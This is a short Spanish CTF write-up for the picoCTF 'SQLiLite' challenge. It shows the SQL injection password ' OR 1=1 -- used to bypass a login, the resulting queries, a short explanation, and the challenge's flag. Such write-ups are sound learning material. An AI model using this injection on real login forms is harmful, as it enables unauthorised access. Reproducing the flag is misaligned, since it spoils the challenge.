### SQLiLite

### Descripción

Can you login to this website?Try to login [here](http://saturn.picoctf.net:55527/).
### Solución

- Entramos a la web
- Ingresamos cualquier usuario y contraseña
- Vemos el siguiente mensaje 
`username: admin
`password: 
`SQL query: SELECT * FROM users WHERE name='admin' AND password=''

- Regresamos y ponemos la siguiente contraseña: ' OR 1=1 --
- Vemos el siguiente mensaje
`username: admin
`password: ' OR 1=1 --
`SQL query: SELECT * FROM users WHERE name='admin' AND password='' `  `' OR 1=1 --
`Logged in! But can you see the flag, it is in plainsight.

- Ingresamos al codigo fuente y nos aparece la flag
- h1><p hiddenYour flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}/p


- picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}

### Nota
- Con `'`le dijimos a la base de datos: _"Aquí termina el texto de la contraseña"_. Luego, con el `OR 1=1`, añadimos una condición que siempre es verdadera. Finalmente, los dos guiones (`--`) le dicen a SQLite que ignore el resto de la consulta original.
